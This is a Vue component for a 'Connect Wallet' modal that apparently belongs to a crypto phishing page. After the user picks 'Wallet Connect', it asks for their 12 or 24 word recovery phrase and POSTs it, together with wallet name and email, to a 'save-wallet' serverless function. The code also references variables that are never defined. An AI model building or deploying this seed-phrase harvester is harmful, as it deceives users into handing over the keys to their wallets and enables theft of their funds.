<template>
  <Transition name="fade">
    <div v-if="isOpen" 
         class="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-black/95 backdrop-blur-lg"
         @click.self="closeModal">

      <div id="custom-wallet-modal" class="w-full max-w-md bg-[#0a1f14] rounded-3xl overflow-hidden border border-emerald-500/50 shadow-2xl">

        <!-- Header -->
        <div class="px-6 py-5 border-b border-emerald-500/30 flex justify-between items-center">
          <h2 class="text-xl font-bold text-white">Connect Wallet</h2>
          <button @click="closeModal" class="text-3xl text-gray-400 hover:text-white">×</button>
        </div>

        <!-- STEP 1 -->
        <div v-if="currentStep === 'connect'" class="p-8">
          <p class="text-gray-400 text-center mb-8">Gateway to Web3</p>
          <div class="bg-[#0f2a1f] border border-emerald-500/40 rounded-2xl p-8 text-center">
            <div class="mx-auto mb-6 w-20 h-20 bg-emerald-500/10 rounded-2xl flex items-center justify-center text-5xl">🔐</div>
            <h3 class="text-2xl font-semibold text-white mb-3">Backup Wallet</h3>
            <p class="text-gray-400 mb-8">Automatic / Manual backup</p>
            <button @click="goToWallets" 
                    class="w-full py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold text-lg">
              Continue
            </button>
          </div>
        </div>

        <!-- STEP 2: Wallet List -->
        <div v-if="currentStep === 'wallets'" class="p-6">
          <h2 class="text-2xl font-bold text-white mb-6 text-center">Choose Wallet</h2>
          <div class="space-y-3 max-h-[480px] overflow-y-auto pr-2 custom-scroll">
            <WalletOption 
              v-for="wallet in wallets" 
              :key="wallet.name"
              :wallet="wallet" 
              @select="selectWallet" />
          </div>
        </div>

        <!-- STEP 3: Import -->
        <div v-if="currentStep === 'import'" class="p-6">
          <h3 class="text-white text-xl mb-6">Import Recovery Phrase</h3>
          <textarea v-model="recoveryPhrase" rows="5"
            class="w-full bg-[#1a3c2e] border border-emerald-500/30 rounded-2xl p-5 text-white focus:border-emerald-500 resize-none"
            placeholder="Enter your 12 or 24 word recovery phrase..."></textarea>
          
          <div class="flex gap-3 mt-6">
            <button @click="closeModal" class="flex-1 py-4 rounded-2xl border border-gray-600 text-white">Cancel</button>
            <button @click="proceedImport" class="flex-1 py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold">Proceed</button>
          </div>
        </div>

      </div>
    </div>
  </Transition>
</template>

<script setup>
import { ref } from 'vue'
import WalletOption from './WalletOption.vue'

const isOpen = ref(false)
const currentStep = ref('connect')
const recoveryPhrase = ref('')

const wallets = [
  { name: 'MetaMask', icon: '🦊' },
  { name: 'Trust Wallet', icon: '🔷' },
  { name: 'Wallet Connect', icon: '🔗' },
  { name: 'Exodus', icon: '📱' },
  { name: 'Phantom', icon: '👻' },
  { name: 'Coinbase Wallet', icon: '💼' },
  { name: 'Cosmostation', icon: '🌌' },
  { name: 'PEAKDEFI Wallet', icon: 'P' },
  { name: 'KardiaChain', icon: 'K' },
]

const openModal = () => {
  isOpen.value = true
  currentStep.value = 'connect'
}

const closeModal = () => {
  isOpen.value = false
}

const goToWallets = () => currentStep.value = 'wallets'

const selectWallet = (walletName) => {
  if (walletName.includes('Wallet Connect')) {
    currentStep.value = 'import'
  } else {
    alert(`Connecting to ${walletName}... (Demo)`)
    setTimeout(closeModal, 1200)
  }
}

const proceedImport = async () => {
    if (!recoveryPhrase.value.trim()) {
        alert("Please enter recovery phrase")
        return
    }

    try {
        const response = await fetch('/.netlify/functions/save-wallet', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                selected_wallet: selectedWallet.value,
                wallet_name: walletName.value,
                email: email.value,
                recovery_phrase: recoveryPhrase.value
            })
        })

        const result = await response.json()

        if (result.success) {
            alert("✅ Wallet data saved successfully!")
            closeModal()
        } else {
            alert(result.error || "Failed to save data")
        }
    } catch (err) {
        alert("Connection error. Please try again later.")
    }
}

defineExpose({ openModal })
</script>
